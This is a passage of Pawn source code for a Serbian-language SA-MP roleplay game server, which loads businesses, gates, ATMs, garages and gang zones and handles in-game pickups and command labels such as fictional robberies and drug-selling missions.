                    format(string, sizeof(string), "{00DCF5}Poslovna Firma"col_white"[ID %d]{00DCF5}\nPosao : "col_white"%s\n{00DCF5}Vlasnik : "col_white"%s\n{00DCF5}Vrsta Firme : "col_white"%s\n{00DCF5}Potreban level: "col_white"%d\n{00DCF5}Adresa Firme: "col_white"%s", IDFirme, firmaIme, BussinesInfo[ IDFirme ][ bOwner ], getBussinesType( IDFirme ), BussinesInfo[ IDFirme ][ bLevel ], UliceFirme( IDFirme ) );
                }
                else {

                    format(string,sizeof(string), ""col_white"[ID %d]{00DCF5}Ime : "col_white"%s\n{00DCF5}Vlasnik Firme : "col_white"%s\n{00DCF5}Vrsta Firme : "col_white"%s\n{00DCF5}Adresa Firme : "col_white"%s\n{00DCF5}Neaktivnost: "col_white"%dh", f, BussinesInfo[f][ bName ],  BussinesInfo[f][ bOwner ], getBussinesType( f ), UliceFirme( f ), BussinesInfo[f][ bNeaktivnost ] );
                    FirmaPickup[f] = CreateDynamicPickup( 1239, 1, BussinesInfo[f][ bEnterX ], BussinesInfo[f][ bEnterY ], BussinesInfo[f][ bEnterZ ] );
                }
            }
            FirmaLabel[ f ] = CreateDynamic3DTextLabel( string, 0x33CCFFAA, BussinesInfo[f][ bEnterX ], BussinesInfo[f][ bEnterY ], BussinesInfo[f][ bEnterZ ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1);
		}
    }
    //------[Kapije]------
    for( new g = 1; g < MAX_GATES; g++ ) {
 		new gFile[ 50 ];
	    format( gFile, sizeof( gFile ), GATE_FILE, g );
	    if( fexist( gFile ) ) {
	        INI_ParseFile( gFile, "LoadGate", .bExtra = true, .extra = g );
	        GateData[ g ][ gateOpened ] = false;
	        GateData[ g ][ gateObject ] = CreateDynamicObject( GateData[ g ][ gateModel ], GateData[ g ][ gatePos ][ 0 ], GateData[ g ][ gatePos ][ 1 ], GateData[ g ][ gatePos ][ 2 ], GateData[ g ][ gatePos ][ 3 ], GateData[ g ][ gatePos ][ 4 ], GateData[ g ][ gatePos ][ 5 ], GateData[ g ][ gateWorld ], GateData[ g ][ gateInterior ] );
		}
	}
    //------[Eventi]------
    for( new i = 1; i < MAX_EVENTS; i++ ) {
		new gFile[ 35 ];
		format( gFile, 35, EVENT_FILE, i );
		if( fexist( gFile ) ) {
			INI_ParseFile( gFile, "LoadEvent", .bExtra = true, .extra = i );
		}
	}
    //------[Kontejneri]------
    for( new ko = 1; ko < MAX_KONT; ko++ ) {
 		new koFile[ 50 ];
	    format( koFile, sizeof( koFile ), KO_FILE, ko );
	    if( fexist( koFile ) ) {
	        INI_ParseFile( koFile, "OcitajKont", .bExtra = true, .extra = ko );
			KontInfo[ ko ][ koObjID ] = CreateDynamicObject(1345, KontInfo[ ko ][ koObjPos ][ 0 ], KontInfo[ ko ][ koObjPos ][ 1 ], KontInfo[ ko ][ koObjPos ][ 2 ], KontInfo[ ko ][ koObjRot ][ 0 ], KontInfo[ ko ][ koObjRot ][ 1 ], KontInfo[ ko ][ koObjRot ][ 2 ] );
            KontLabel[ko] = CreateDynamic3DTextLabel(""col_white"Da pretrazite kontenjer kucajte\n"col_crvena"[ /kopajkontenjer ]", 0x0000000FF, KontInfo[ ko ][ koObjPos ][ 0 ], KontInfo[ ko ][ koObjPos ][ 1 ], KontInfo[ ko ][ koObjPos ][ 2 ]+1, 20.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1, -1, 20.0, -1, 0);
            ServerInfo[ BrojKontejnera ]++;
		}
	}
	//------[Bankomati]------
    for( new atm = 1; atm < MAX_ATM; atm++ ) {
 		new aFile[ 50 ];
	    format( aFile, sizeof( aFile ), ATM_FILE, atm );
	    if( fexist( aFile ) ) {
	        INI_ParseFile( aFile, "LoadATM", .bExtra = true, .extra = atm );
			atmInfo[ atm ][ atmObject ] = CreateDynamicObject(2942, atmInfo[ atm ][ atmPos ][ 0 ], atmInfo[ atm ][ atmPos ][ 1 ], atmInfo[ atm ][ atmPos ][ 2 ], atmInfo[ atm ][ atmPos ][ 3 ], atmInfo[ atm ][ atmPos ][ 4 ], atmInfo[ atm ][ atmPos ][ 5 ] );
            atmInfo[ atm ][ atmText3D ] = CreateDynamic3DTextLabel( ""col_white"Da koristite bankomat kucajte\n"col_crvena"[ /atm ]", -1, atmInfo[ atm ][atmPos][0], atmInfo[ atm ][atmPos][1], atmInfo[ atm ][atmPos][2], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, -1, -1 );
		}
	}
	//------[Radari]------
    for( new radarID = 1; radarID < MAX_RADARS; radarID++ ) {
    
 		new radarFile[ 50 ];
	    format( radarFile, sizeof( radarFile ), F_RADARS, radarID );
	    if( fexist( radarFile ) ) {
	    
	        INI_ParseFile( radarFile, "LoadRadar", .bExtra = true, .extra = radarID );
			radarInfo[ radarID ][ radarObject ] = CreateDynamicObject( 18880, radarInfo[ radarID ][ radarPos ][ 0 ], radarInfo[ radarID ][ radarPos ][ 1 ], radarInfo[ radarID ][ radarPos ][ 2 ], radarInfo[ radarID ][ radarPos ][ 3 ], radarInfo[ radarID ][ radarPos ][ 4 ], radarInfo[ radarID ][ radarPos ][ 5 ] );
		}
	}
	//------[GPS]------
	for( new id = 1; id < MAX_GPS; id++ ) {

		new filename[ 32 ];
		format( filename, sizeof( filename ), F_GPS, id );

		if( fexist( filename ) ) {
		    INI_ParseFile( filename, "LoadGPS", .bExtra = true, .extra = id );
		}
	}
	//------[Garaze]------
	for( new id = 1; id < MAX_GARAGES; id++ ) {

		new filename[ 32 ];
		format( filename, sizeof( filename ), F_GARAGE, id );

		if( fexist( filename ) ) {

            new string[ 256 ], vrsta[ 20 ];

			INI_ParseFile( filename, "LoadGarages", .bExtra = true, .extra = id );

            switch( garageInfo[ id ][ garageType ] ) {
			    case 0: {
					vrsta = "Mala garaza";
				}
				case 1: {
					vrsta = "Srednja garaza";
				}
				case 2: {
					vrsta = "Velika garaza";
				}
			}

			if( !garageInfo[ id ][ garageOwned ] ) {
		    	format( string, sizeof( string ), ""col_orange"Garaza na prodaju"col_white"[ID %d]\n"col_orange"Tip garaze: "col_white"%s\n"col_orange"Cena garaze: "col_white"%d\n"col_orange"Potreban level: "col_white"%d\n"col_orange"Za kupovinu kucajte "col_white"/kupigarazu", id, vrsta, garageInfo[ id ][ garagePrice ], garageInfo[ id ][ garageLevel ] );
			}
			else if( garageInfo[ id ][ garageOwned ] ) {
			    format( string, sizeof( string ), ""col_white"[ID %d]"col_orange"Vlasnik: "col_white"%s\n"col_orange"Tip garaze: "col_white"%s\n"col_orange"Potreban level: "col_white"%d\n"col_orange"Za ulaz koristite "col_white"/genter", id, garageInfo[ id ][ garageOwner ], vrsta, garageInfo[ id ][ garageLevel ] );
			}
			garageInfo[ id ][ garage3D ] = CreateDynamic3DTextLabel( string, BELA, garageInfo[ id ][ garagePos ][ 0 ], garageInfo[ id ][ garagePos ][ 1 ], garageInfo[ id ][ garagePos ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0 );
			garageInfo[ id ][ garagePickup ] = CreateDynamicPickup( 19130, 1, garageInfo[ id ][ garagePos ][ 0 ], garageInfo[ id ][ garagePos ][ 1 ], garageInfo[ id ][ garagePos ][ 2 ], 0, 0 );
		}
	}
	
	//------[GZone]------
	for( new id = 1; id < MAX_GZONE; id++ ) {

		new filename[ 32 ];
		format( filename, sizeof( filename ), F_GZONE, id );

		if( fexist( filename ) ) {

            new string[ 256 ];

			INI_ParseFile( filename, "GZone_Load", .bExtra = true, .extra = id );

            gZoneInfo[ id ][ gZoneTime ] = 0;
			if( !gZoneInfo[ id ][ gZoneTaken ] ) {
			
				gZoneInfo[ id ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ id ][ gZonePickupPos ][ 0 ], gZoneInfo[ id ][ gZonePickupPos ][ 1 ], gZoneInfo[ id ][ gZonePickupPos ][ 2 ], 0, 0 );
                format(string, sizeof(string), ""col_white"[ TERITORIJA ]\nTeritorija je "col_crvena"slobodna"col_white"\nVrsta Zone : "col_crvena"%s"col_white"\nAko zelis da je zauzmes kucaj "col_crvena"/zauzmi", getZoneType(id));
				gZoneInfo[ id ][ gZone3D ] = CreateDynamic3DTextLabel( string, BELA, gZoneInfo[ id ][ gZonePickupPos ][ 0 ], gZoneInfo[ id ][ gZonePickupPos ][ 1 ], gZoneInfo[ id ][ gZonePickupPos ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0 );
			}
			else if( gZoneInfo[ id ][ gZoneTaken ] ) {

			    gZoneInfo[ id ][ gZonePickup ] = CreateDynamicPickup( 1313, 1, gZoneInfo[ id ][ gZonePickupPos ][ 0 ], gZoneInfo[ id ][ gZonePickupPos ][ 1 ], gZoneInfo[ id ][ gZonePickupPos ][ 2 ], 0, 0 );
			    format( string, sizeof( string ), ""col_white"[ TERITORIJA ]\nTeritorija je u vlasnistvu bande "col_crvena"%s"col_white"\nVrsta Zone : "col_crvena"%s"col_white"\nAko zelis da je zauzmes kucaj "col_crvena"/zauzmi",  OI[ gZoneInfo[ id ][ gZoneGangID ] ][ oName ], getZoneType(id) );
			    gZoneInfo[ id ][ gZone3D ] = CreateDynamic3DTextLabel( string, BELA, gZoneInfo[ id ][ gZonePickupPos ][ 0 ], gZoneInfo[ id ][ gZonePickupPos ][ 1 ], gZoneInfo[ id ][ gZonePickupPos ][ 2 ], 15.0, INVALID_PLAYER_ID, INVALID_VEHICLE_ID, 0, 0, 0 );
			}
			
			gZoneInfo[ id ][ gZoneID ] = GangZoneCreate( gZoneInfo[ id ][ gZoneMinX ], gZoneInfo[ id ][ gZoneMinY ], gZoneInfo[ id ][ gZoneMaxX ], gZoneInfo[ id ][ gZoneMaxY ] );
            gZoneInfo[ id ][ gZoneRectAngle ] = CreateDynamicRectangle( gZoneInfo[ id ][ gZoneMinX ], gZoneInfo[ id ][ gZoneMinY ], gZoneInfo[ id ][ gZoneMaxX ], gZoneInfo[ id ][ gZoneMaxY ], -1, -1, -1 );
		}
	}
	
	if( fexist( "Ostalo/anticheat.ini" ) ) {
        INI_ParseFile( "Ostalo/anticheat.ini", "LoadAntiCheat" );
    }

    if( fexist( "Ostalo/serverstats.ini" ) ) {
        INI_ParseFile( "Ostalo/serverstats.ini", "LoadServerStats" );
    }

    deoniceNewPrice();

    if( fexist( "Ostalo/plateServera.ini" ) ) {
        INI_ParseFile( "Ostalo/plateServera.ini", "LoadServerPlate" );
    }

    if(ServerInfo[HappyHours]) {
        SendRconCommand("hostname [V] Valhalla [ HappyHours ]");
    }
    
    if( fexist( "Ostalo/StariParovi.ini" ) ) {
        INI_ParseFile( "Ostalo/StariParovi.ini", "LoadStareParove" );
    }

    LoadAports( );
    LoadSports( );

    skinlist = LoadModelSelectionMenu("skins.txt"); // load skins for buy
}
//------------------------------------------------------------------------------
DefineGatesAndDoors( ) {

    gradjkapija = CreateDynamicObject(2909,2413.5092800,-1374.3330100,24.8653000,0.0000000,0.0000000,270.0000000);

    promkapija = CreateDynamicObject(971, 1694.98083, 1944.81506, 12.43130,   0.00000, 0.00000, 90.00000);
    PromoterskaKapija = false;
	
    vipkapija = CreateDynamicObject(971, 1957.28650, 27.16401, 34.93608,   0.00000, 0.00000, -180.30002 );
}
//------------------------------------------------------------------------------

public OnPlayerPickUpDynamicPickup( playerid, pickupid ) {

    if(PubgPokrenut) {

        for(new i = 0; i < MAX_PUBGWEAPONS; i++) {

            if(pickupid == pubgPickup[i] && PubgIgra[playerid]) {

                DestroyDynamicPickup(pubgPickup[i]);

                giveRandomPubgWeapon(playerid);
            }
        }
    }

    if(pickupid == TorbaBankaPickup) {

        if(!ClanIlegalaca(playerid) && !ClanPolicije(playerid)) return 0;
        if(ClanPolicije(playerid)) {

            NosiBankaTorbu[playerid] = true;
            DestroyDynamicPickup(TorbaBankaPickup);
            RemovePlayerAttachedObject(playerid, OBJECT_SLOT_BADGE);
            SetPlayerAttachedObject( playerid, OBJECT_SLOT_BADGE, 1550, 1, -0.008714, -0.188819, -0.026564, 159.138153, 86.558647, 0.000000, 1.005565, 0.984468, 1.014210 );

            new org = PlayerInfo[playerid][xClan];

            SetPlayerCheckpoint(playerid, OI[org][oPozExtX], OI[org][oPozExtY], OI[org][oPozExtZ], 5.0);

            SendInfoMessage(playerid, "Pokupio si torbu sa novcem! Odnesi torbu u Policijsku Stanicu!");

            return 1;
        }

        NosiBankaTorbu[playerid] = true;
        DestroyDynamicPickup(TorbaBankaPickup);
        RemovePlayerAttachedObject(playerid, OBJECT_SLOT_BADGE);
        SetPlayerAttachedObject( playerid, OBJECT_SLOT_BADGE, 1550, 1, -0.008714, -0.188819, -0.026564, 159.138153, 86.558647, 0.000000, 1.005565, 0.984468, 1.014210 );

        new org = PlayerInfo[playerid][xClan];

        SetPlayerCheckpoint(playerid, OI[org][oPozExtX], OI[org][oPozExtY], OI[org][oPozExtZ], 5.0);

        SendInfoMessage(playerid, "Pokupio si torbu sa novcem! Odnesi torbu u svoju organizaciju!");
        return 1;
    }

    if(pickupid == FavellaNovacPickup) {

        if(GetFactionType(playerid) != ORG_TIP_MAFIJA && GetFactionType(playerid) != ORG_TIP_BANDA && GetFactionType(playerid) != ORG_TIP_PD) {

            SendInfoMessage(playerid, "Samo clanovi bande/mafije ili policija!");
            return 0;
        }

        if(IsValidDynamicPickup(FavellaPickup))
            DestroyDynamicPickup(FavellaPickup);

        if(GetFactionType(playerid) == ORG_TIP_PD) {

            SendClientMessageToAll(0x0085C5FF, "(Favelle) : {FFFFFF}Policija je uspesno sprecila prodaju droge!");
            return 1;
        }

        RemovePlayerAttachedObject(playerid, 8);
        SetPlayerAttachedObject( playerid, 8, 1550, 1, -0.008714, -0.188819, -0.026564, 159.138153, 86.558647, 0.000000, 1.005565, 0.984468, 1.014210 );

        SendInfoMessage(playerid, "Uzeo si torbu sa novcem! Odnesi je do svoje organizacije!");

        NosiFavella[playerid] = true;

        new OrgID = PlayerInfo[playerid][xClan];

        Novi_DisablePlayerCheckpoint(playerid);
        Novi_SetPlayerCheckpoint(playerid, OI[OrgID][oPozExtX], OI[OrgID][oPozExtY], OI[OrgID][oPozExtZ], 5.0);

        return 1;
    }

    if(pickupid == FavellaPickup) {

        if(GetFactionType(playerid) != ORG_TIP_MAFIJA && GetFactionType(playerid) != ORG_TIP_BANDA && GetFactionType(playerid) != ORG_TIP_PD) {

            SendInfoMessage(playerid, "Samo clanovi bande/mafije ili policija!");
            return 0;
        }

        if(IsValidDynamicPickup(FavellaPickup))
            DestroyDynamicPickup(FavellaPickup);

        if(GetFactionType(playerid) == ORG_TIP_PD) {

            stop FavellaPickupTimer;
            ProdajaFavella = false;
            SendClientMessageToAll(0x0085C5FF, "(Favelle) : {FFFFFF}Policija je uspesno sprecila prodaju droge!");
            
            return 1;
        }

        ProdajeKokain[playerid] = FavellaVreme;
        ProdajeKokainRange[playerid] = 0;
        UmroKoks[playerid] = false;

        stop FavellaPickupTimer;

        FavellaTDControl(playerid, true);

        SendInfoMessage(playerid, "Nastavio si prodaju kokaina! Ostani blizu Favelle!");

        defer ProdajeKokainTimer(playerid);

        return 1;
    }

    if(pickupid == MuzejSlikaPickup) {

        if(!ClanIlegalaca(playerid) && !ClanPolicije(playerid)) return 0;
        if(!MuzejPokrenut) return DestroyDynamicPickup(MuzejSlikaPickup);

        if(ClanPolicije(playerid)) {

            KreirajSliku();
            SendClientMessageToAll(-1, ""col_red"====================================="col_white" [ VANDREDNE VESTI ] "col_red"=====================================");
            SendClientMessageToAll(-1, ""col_red"REPORTER: "col_white"Kako doznajemo policija je pronasla kriminalnu organizaciju i vratila sliku u "col_red"MUZEJ"col_white"!");
            SendClientMessageToAll(-1, ""col_red"===============================================================================================================");
            DestroyDynamicPickup(MuzejSlikaPickup);
            return 1;
        }

        NosiSliku[playerid] = true;

        Novi_SetPlayerCheckpoint(playerid, 525.3239,-2563.0830,4.2118, 5.0);

        SendInfoMessage(playerid, "Uspesno si uzeo sliku! Odnesi je na crno trziste!");

        DestroyDynamicPickup(MuzejSlikaPickup);
        return 1;
    }

    if(pickupid == PaketPickup) {

        if(StvorenPaket && !NosiPaket[playerid] && GetFactionType(playerid) == ORG_TIP_MAFIJA) {

            
            DestroyDynamicPickup(PaketPickup);

            RemovePlayerAttachedObject(playerid, 8);
            SetPlayerAttachedObject( playerid, 8, 1550, 1, -0.008714, -0.188819, -0.026564, 159.138153, 86.558647, 0.000000, 1.005565, 0.984468, 1.014210 );

            SendInfoMessage(playerid, "Pokupio si torbu sa novcem, odnesi je na lokaciju!");

            NosiPaket[playerid] = true;

            new OrgID = PlayerInfo[playerid][xClan];

            Novi_DisablePlayerCheckpoint(playerid);
            Novi_SetPlayerCheckpoint(playerid, OI[OrgID][oPozExtX], OI[OrgID][oPozExtY], OI[OrgID][oPozExtZ], 5.0);

            return 1;
        }
    }

    for(new i = 0; i < MAX_JOBS; i++) {

        if(pickupid == posaoPickup[i]) {

            new str[32];
            format(str, sizeof(str), "%s", getJobName(i));

            if(PosaoTDShowed[playerid]) return 0;
            ChosenJob[playerid] = i;
            ZaposljavanjeTDControl( playerid, true, str, "zarada:       ~w~po ruti", "ugovor:              ~w~3h" );

            return 1;
        }
    }
    return 1;
}
//------------------------------------------------------------------------------
CreatePickupsAnd3Ds( ) {

    //pdtest
    Create3DandP(""col_white"Da polazete PD Test kucajte\n"col_crvena"[ /pdtest (5.000$) ]", 660.4894,2529.2605,-89.4551, -1, -1, 1239, 2.0 );

    //casino
    Create3DandP(""col_white"Da igrate rulet kucajte\n"col_crvena"[ /roulette ]", 1115.5215,-42.2543,994.1146, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da igrate rulet kucajte\n"col_crvena"[ /roulette ]", 1115.7690,-58.8871,994.1146, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite pice kucajte\n"col_crvena"[ /pice ]", 1116.5618,-44.7496,994.1146, -1, -1, 1239, 2.0 );

    Create3DandP(""col_white"Da otvorite case kucajte\n"col_crvena"[ /opencase ]", 1366.1959,-1329.7948,13.5391, -1, -1, 1239, 2.0 );

    Create3DandP(""col_white"Da uplatite lotto listic kucajte\n"col_crvena"[ /uplatilotto ]", 1687.3138,-1450.1989,13.5469, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da podigne lotto dobitak kucajte\n"col_crvena"[ /podignidobitak ]", 1689.9851,-1449.8799,13.5469, -1, -1, 1239, 2.0 );

    Create3DandP(""col_white"Da uzmete VIP/Promoter vozilo kucajte\n"col_crvena"[ /vpveh ]",1078.5199,1287.8156,10.8199, -1, -1, 1239, 2.0 );

    Create3DandP(""col_white"Ostanite u blizini i sacekajte da snesko ostavi poklon\nDa podmitite sneska [ /doniraj ]",1878.4663,-1385.0624,13.5734, -1, -1, 19054, 10.0 );

    Create3DandP(""col_white"Da zapocnete posao Delivery kucajte\n"col_crvena"[ /posao ]",-71.5509,-1589.5165,2.6172, -1, -1, 1210, 2.0 );
    Create3DandP(""col_white"Da zapocnete posao Astronaut kucajte\n"col_crvena"[ /posao ]",208.0606,1740.7100,17.6025, -1, -1, 1636, 2.0 );
    Create3DandP(""col_white"Da zapocnete posao Pilot kucajte\n"col_crvena"[ /posao ]",3521.1870,-934.2792,11.1237, -1, -1, 1210, 2.0 );
    Create3DandP(""col_white"Da zapocnete posao Elektricar kucajte\n"col_crvena"[ /posao ]",1999.0894,-2015.2059,13.5750, -1, -1, 1210, 2.0 );

    Create3DandP(""col_white"Da presecete zice kucajte\n"col_crvena"[ /presecizice ]",571.8676,-1453.1642,23.5259, -1, -1, 335, 2.0 );

    ///////////////////////////// Mehanicar

    Create3DandP(""col_white"Da kupite stvari kod mehanicara kucajte\n"col_crvena"[ /mehanicar ]", 1892.1112,-1086.4977,24.5365, -1, -1, 19627, 2.0 );
    Create3DandP(""col_white"Da kupite stvari kod mehanicara kucajte\n"col_crvena"[ /mehanicar ]", 1373.4554,-1505.6053,13.7364, -1, -1, 19627, 2.0 );
    Create3DandP(""col_white"Da kupite stvari kod mehanicara kucajte\n"col_crvena"[ /mehanicar ]", 1224.1948,-989.4682,43.6764, -1, -1, 19627, 2.0 );
    Create3DandP(""col_white"Da kupite stvari kod mehanicara kucajte\n"col_crvena"[ /mehanicar ]", 605.1835,-1516.8864,15.1464, -1, -1, 19627, 2.0 );
    Create3DandP(""col_white"Da kupite stvari kod mehanicara kucajte\n"col_crvena"[ /mehanicar ]", 309.8067,-1372.5594,14.4564, -1, -1, 19627, 2.0 );

    //////////////////////////// Apoteka

    Create3DandP(""col_white"Da kupite stvari u apoteci kucajte\n"col_crvena"[ /pharmacy ]", 1295.9462,-1870.4811,13.5561, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite medkit kucajte\n"col_crvena"[ /kupimedkit ]", 1298.3145,-1865.2567,13.5561, -1, -1, 11738, 2.0 );

    ///////////////////////////////////////////

    Create3DandP(""col_white"Da kupite skate kucajte\n"col_crvena"[ /buyskate ( 1000$ ) ]", 1866.1566,-1396.7372,13.4941, -1, -1, 1239, 2.0 );

    Create3DandP(""col_white"Da trgujete deonicama kucajte\n"col_crvena"[ /deonice ]", -791.1401,1936.2529,3.0459, -1, -1, 2059, 2.0 );

    // Create3DandP(""col_white"Da cipujete vozilo kucajte\n"col_crvena"[ /cipujvozilo ]\n"col_white"Da iskoristite spec tune kucajte\n"col_crvena"[ /spectune ]", -2183.8901,715.0043,54.0909, -1, -1, 1239, 2.0 );

    Create3DandP(""col_white"Da preradite kokain kucajte\n"col_crvena"[ /preradikokain ]", 2152.8135,-2270.9937,13.3090, -1, -1, 18631, 2.0 );
    Create3DandP(""col_white"Da uzmete preradjeni kokain kucajte\n"col_crvena"[ /preradjenikokain ]", 2143.9131,-2265.1423,13.2955, -1, -1, 1279, 2.0 );

    Create3DandP(""col_white"Da prodate drogu kucajte\n"col_crvena"[ /prodajkokain ]", 2090.9043,-972.8184,51.9200, -1, -1, 1579, 2.0 );

    Create3DandP(""col_white"Da odaberete misiju kucajte\n"col_crvena"[ /misije ]", 984.0812,-1551.6519,22.9322, -1, -1, 1254, 2.0 );

    Create3DandP(""col_white"Da kupite delove za WorkShop kucajte\n"col_crvena"[ /kupidelove ]", 2376.1082,-2017.1085,14.8329, -1, -1, 19832, 2.0 );

    Create3DandP(""col_white"Da napravite oruzije\n"col_crvena"[ /makegun ]",525.1547,-2335.6174,508.6938, -1, -1, 2044, 2.0 );

    Create3DandP(""col_white"Da prodate bitcoin banci\n"col_crvena"[ /btcprodaja ]",1010.5294,1873.7450,1203.5000, -1, -1, 1276, 2.0 );
    Create3DandP(""col_white"Da prodate bitcoin black marketu\n"col_crvena"[ /btcprodaja ]",524.3888,-2558.3857,4.2118, -1, -1, 1276, 2.0 );

    //Create3DandP(""col_white"Da preradite kokain kucajte\n"col_crvena"[ /preradikokain ]",2146.3359,-2269.5913,13.3036, -1, -1, 1580, 2.0 );

    Create3DandP(""col_white"Da koristite kran kucajte\n"col_crvena"[ /kran ]",2793.3655,-2395.2900,17.2745, -1, -1, 1239, 2.0 );

    Create3DandP(""col_white"Da operete novac kucajte\n"col_crvena"[ /operinovac ]", -87.9631,-1212.4119,2.8906, -1, -1, 1212, 2.0);
    Create3DandP(""col_white"Da koristite Black Market kucajte\n"col_crvena"[ /blackmarket ]", 525.3239,-2563.0830,4.2118, -1, -1, 2061, 2.0);

    Create3DandP(""col_crvena"[ Kanalizacija ]\n"col_white"'ENTER' za ulaz", 1121.9723,1540.4227,4451.8110, -1, -1, 19133, 2.0);
    Create3DandP(""col_crvena"[ Kanalizacija Izlaz ]\n"col_white"'ENTER' za izlaz", -921.1987,-920.5673,1107.0656, -1, -1, 19133, 2.0);      

    // Create3DandP(""col_white"Izvlacenje zatvorenika\n"SRVBOJA1SCM"[ /izvucizatvorenika ]", 1798.0217,-1578.1200,14.0855, -1, -1, 2894, 2.0);
    // Create3DandP(""col_white"Advokatski Poziv\n"SRVBOJA1SCM"[ /advokatpozovi /advokatlista ]", -1414.8182,-1465.9420,101.6462, -1, -1, 2894, 2.0);

    Create3DandP(""col_white"Pokupi kutiju\n"SRVBOJA1SCM"[ /pokupikutiju ]", -1419.2917,-1478.0883,101.7550, -1, -1, 1210, 2.0);
    Create3DandP(""col_white"Ostavi kutiju\n"SRVBOJA1SCM"[ /ostavikutiju ]", -1449.0287,-1593.5349,101.7578, -1, -1, 1210, 2.0);

	Create3DandP(""col_white"Za vojnik misije\n"col_crvena"[ /vojnikmisije ]", 414.6642, 2535.1963, 19.1484, -1, -1, 1318, 2.0);
	Create3DandP(""col_white"Za vojnik opremu\n"col_crvena"[ /vojnikoprema ]", 409.3252, 2528.0249, 16.5753, -1, -1, 2035, 2.0);

    Create3DandP(""col_white"Hangar paketi\n"col_crvena"[ /hangar ]", 4551.8926,-327.4721,11.0860, -1, -1, 1318, 20.0);

	Create3DandP(""col_white"Da kupite seme kucajte\n"col_crvena"[ /kupisemedroge ]", 1937.1750, -1984.4272, 13.5469, -1, -1, 2060, 2.0);
	Create3DandP(""col_white"Da preradite drogu kucajte\n"col_crvena"[ /preradidrogu ]", -1435.7037, -963.8199, 201.0211, -1, -1, 1279, 2.0);

    //Create3DandP(""col_white"Za Bolnicar opremu\n"col_crvena"[ /uniforma ]", 1172.5166,-1321.6505,15.3993, -1, -1, 1275, 2.0 );

    Create3DTextLabel("[ Kosac trave ]", 0x008080FF, 1889.0767, -1157.4584, 2400.1715, 20.0, 0, 0); //lala
    //Create3DTextLabel("[ DILER ]\n/diler", 0x008080FF, 1641.5375,-1679.3185,13.5371, 10.0, 0, 0);
	// clothing system
    Create3DandP(""col_white"Da kupite sesir/kapu kucajte\n"col_crvena"[ /buyhats ]", 205.0401, -100.3267, 1005.2578, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite maramu za glavu kucajte\n"col_crvena"[ /buyhbandanas ]", 171.4970, -92.8723, 1001.8047, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite maramu za lice kucajte\n"col_crvena"[ /buyfbandanas ]", 151.2055, -92.5647, 1001.8047, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite naocare kucajte\n"col_crvena"[ /buyglasses ]", 209.8154, -33.7277, 1001.9297, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite kacket kucajte\n"col_crvena"[ /buycaps ]", 209.3052, -7.9960, 1005.2109, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite novu odecu kucajte\n"col_crvena"[ /kupiodecu ]", 206.3761, -8.1491, 1001.2109, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite novu odecu kucajte\n"col_crvena"[ /kupiodecu ]", 161.1792, -83.2523, 1001.8047, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite novu odecu kucajte\n"col_crvena"[ /kupiodecu ]", 208.0208, -100.3269, 1005.2578, -1, -1, 1239, 2.0 );
    Create3DandP(""col_white"Da kupite novu odecu kucajte\n"col_crvena"[ /kupiodecu ]", 203.7806, -43.2623, 1001.8047, -1, -1, 1239, 2.0 );

	Create3DandP(""col_crvena"Dobrodosli na "SRVBOJA1SCM"Valhalla "col_white"Roleplay "col_crvena"server\nServer koristi mode "col_white"V1.5.1 "col_crvena"by V01D", 2354.0776,-1783.8713,13.3217, -1, -1, 18749, 20.0 );
    Create3DandP(""col_crvena"Dobrodosli na "SRVBOJA1SCM"Valhalla "col_white"Roleplay "col_crvena"server\nServer koristi mode "col_white"V1.5.1 "col_crvena"by V01D", 2299.6265,-1793.8251,13.3217, -1, -1, 18749, 20.0 );
	// kiosci
    Create3DandP( ""col_white"Ukoliko zelite kupiti nesto kucajte\n"col_crvena"[/tkupi]\n[/robtrafika]", 1174.0956, -936.1318, 42.8307, -1, -1, 1318, 5.0 );
	Create3DandP( ""col_white"Ukoliko zelite kupiti nesto kucajte\n"col_crvena"[/tkupi]\n[/robtrafika]", 1514.9395, -1031.0515, 23.7966, -1, -1, 1318, 5.0 );
	Create3DandP( ""col_white"Ukoliko zelite kupiti nesto kucajte\n"col_crvena"[/tkupi]\n[/robtrafika]", 1202.5309, -1275.9502, 13.3616, -1, -1, 1318, 5.0 );
	Create3DandP( ""col_white"Ukoliko zelite kupiti nesto kucajte\n"col_crvena"[/tkupi]\n[/robtrafika]", 1418.1516, -1721.0294, 13.5469, -1, -1, 1318, 5.0 );
	Create3DandP( ""col_white"Ukoliko zelite kupiti nesto kucajte\n"col_crvena"[/tkupi]\n[/robtrafika]", 339.2676, -1771.2668, 5.1687, -1, -1, 1318, 5.0 );
	Create3DandP( ""col_white"Ukoliko zelite kupiti nesto kucajte\n"col_crvena"[/tkupi]\n[/robtrafika]", 1023.6545, -1332.1298, 13.3842, -1, -1, 1318, 5.0 );
	Create3DandP( ""col_white"Ukoliko zelite kupiti nesto kucajte\n"col_crvena"[/tkupi]\n[/robtrafika]", 1189.3583, -1706.9924, 13.5755, -1, -1, 1318, 5.0 );
	Create3DandP( ""col_white"Ukoliko zelite kupiti nesto kucajte\n"col_crvena"[/tkupi]\n[/robtrafika]", 2083.0374, -1760.8845, 13.5625, -1, -1, 1318, 5.0 );
	Create3DandP( ""col_white"Ukoliko zelite kupiti nesto kucajte\n"col_crvena"[/tkupi]\n[/robtrafika]", 2264.8145, -1309.9031, 23.9844, -1, -1, 1318, 5.0 );
	//
	Create3DandP(""col_white"Da uplatite tiket kucajte\n"col_crvena"[ /sastavitiket ]", 2392.3293,2151.5359,1001.0859, -1, -1, 1239, 5.0 );
